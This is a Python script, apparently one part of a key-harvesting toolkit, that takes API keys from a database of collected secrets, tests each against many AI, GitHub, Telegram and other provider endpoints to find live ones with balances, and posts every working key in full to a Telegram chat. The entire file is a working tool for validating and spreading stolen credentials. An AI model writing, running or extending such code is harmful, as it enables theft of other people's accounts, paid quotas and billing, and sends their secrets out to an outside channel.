#!/usr/bin/env python3
"""RECYCLER — re-probe NEW + DEAD keys with the universal classifier.

Why: DeepSeek / DashScope / Kimi share the sk-<hex> shape, so the regex
classifier mislabels many keys, and the main validator leaves a big NEW
backlog. The recycler takes those, probes every provider with auth-gated
endpoints, and:
  • flips a key to WORKING/FREE when it's alive somewhere
  • posts newly-revived keys to Telegram
  • writes a recycle report

Run:  python recycler.py --once            # single pass
      python recycler.py --loop            # every 20 min
      python recycler.py --once --limit 500
"""
import argparse
import json
import os
import sqlite3
import sys
import time
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import universal_validator as uv
import concurrent.futures as cf

DB = Path(os.environ.get('KF_DB', str(Path(__file__).resolve().parent / 'data' / 'keys.db')))
REPORT = Path(os.environ.get('KF_RECYCLE_REPORT',
                             str(Path(__file__).resolve().parent / 'data' / 'recycle_report.json')))
BOT = os.environ.get('TG_BOT_TOKEN', '')
CHAT = int(os.environ.get('TG_CHAT_ID', '0') or 0)


def tg(method, **params):
    if not BOT or not CHAT:
        return {'ok': False}
    url = f'https://api.telegram.org/bot{BOT}/{method}'
    req = urllib.request.Request(url, data=json.dumps(params).encode(),
                                 headers={'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return json.loads(r.read())
    except Exception:
        return {'ok': False}


import re as _re
# Minimum shape a key must have to be worth a network probe.
_SHAPE = _re.compile(r'^(sk-[A-Za-z0-9_-]{16,}|r8_[A-Za-z0-9]{20,}|gsk_[A-Za-z0-9]{20,}|'
                     r'ghp_[A-Za-z0-9]{30,}|xai-[A-Za-z0-9]{20,}|pplx-[A-Za-z0-9]{20,}|'
                     r'AIza[A-Za-z0-9_-]{20,}|\d{8,11}:[A-Za-z0-9_-]{30,}|'
                     r'hf_[A-Za-z0-9]{20,}|[a-f0-9]{32}\.[A-Za-z0-9]{8,}|'
                     r'nvapi-[A-Za-z0-9_-]{20,}|CAP-[A-Z0-9]{20,}|tvly-[A-Za-z0-9]{20,}|'
                     r'fw_[A-Za-z0-9]{20,}|sk-or-[A-Za-z0-9-]{20,}|'
                     r'[A-Za-z0-9_-]{30,})$')


def fetch(limit):
    c = sqlite3.connect(f'file:{DB.as_posix()}', uri=True, timeout=15)
    rows = list(c.execute(
        "SELECT id, val, prov FROM keys WHERE status IN ('NEW','DEAD') "
        "ORDER BY CASE status WHEN 'NEW' THEN 0 ELSE 1 END, id DESC LIMIT ?", (limit,)))
    c.close()
    # pre-filter: skip obvious junk (too short, placeholder chars) before probing
    out = []
    for kid, val, prov in rows:
        v = (val or '').strip()
        if len(v) < 16 or v.lower() in ('none', 'null', 'undefined'):
            continue
        if v.count('x') > len(v) * 0.5 or len(set(v)) <= 3:
            continue
        out.append((kid, v, prov))
    return out


def classify(item):
    kid, val, prov = item
    hits = uv.probe_all(val)
    return kid, val, prov, hits


def mark(kid, status, prov, models, balance):
    c = sqlite3.connect(f'file:{DB.as_posix()}', uri=True, timeout=15)
    models_str = ', '.join(models)[:60] if models else ''
    c.execute("UPDATE keys SET status=?, prov=?, plan=?, price=? WHERE id=?",
              (status, prov, models_str, balance or '', kid))
    c.commit()
    c.close()


def post(prov, key, models, balance):
    lines = [f"♻️ ВОСКРЕШЁН | <b>{prov.upper()}</b>", f"🔑 <code>{key}</code>"]
    if balance:
        lines.append(f"💰 Баланс: <b>{balance}</b>")
    if models:
        lines.append(f"🧠 Модели: <b>{', '.join(models[:6])}</b>")
    tg('sendMessage', chat_id=CHAT, text='\n'.join(lines), parse_mode='HTML',
       disable_web_page_preview=True)
    time.sleep(1.2)


def one_pass(limit):
    rows = fetch(limit)
    print(f'[recycle] probing {len(rows)} NEW/DEAD keys against '
          f'{len(uv.AUTH_PROBE) + len(uv.SPECIAL_PROBES)} providers', flush=True)
    revived = 0
    seen = set()
    with cf.ThreadPoolExecutor(max_workers=12) as ex:
        for kid, val, prov, hits in ex.map(classify, rows):
            if val in seen:
                continue
            seen.add(val)
            if not hits:
                continue
            h = hits[0]
            newprov = h['provider'].upper()
            models = h.get('models', [])
            balance = h.get('balance', '')
            status = 'WORKING' if balance or newprov in ('REPLICATE', 'GITHUB_PAT', 'TELEGRAM_BOT') else 'FREE'
            mark(kid, status, newprov, models, balance)
            revived += 1
            print(f'[recycle] ♻️ {prov}→{newprov} {status} {val[:14]}...', flush=True)
            if BOT and CHAT:
                post(newprov, val, models, balance)
    rep = {'ts': int(time.time()), 'probed': len(rows), 'revived': revived}
    REPORT.parent.mkdir(parents=True, exist_ok=True)
    hist = []
    try:
        hist = json.loads(REPORT.read_text())
    except Exception:
        pass
    hist.append(rep)
    REPORT.write_text(json.dumps(hist[-200:], indent=1))
    print(f'[recycle] pass done: {revived} revived / {len(rows)} probed', flush=True)
    return revived


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--limit', type=int, default=400)
    ap.add_argument('--once', action='store_true')
    ap.add_argument('--loop', action='store_true')
    a = ap.parse_args()
    if a.loop:
        while True:
            try:
                one_pass(a.limit)
            except Exception as e:
                print('[recycle] err:', e, flush=True)
            time.sleep(1200)
    else:
        one_pass(a.limit)


if __name__ == '__main__':
    main()
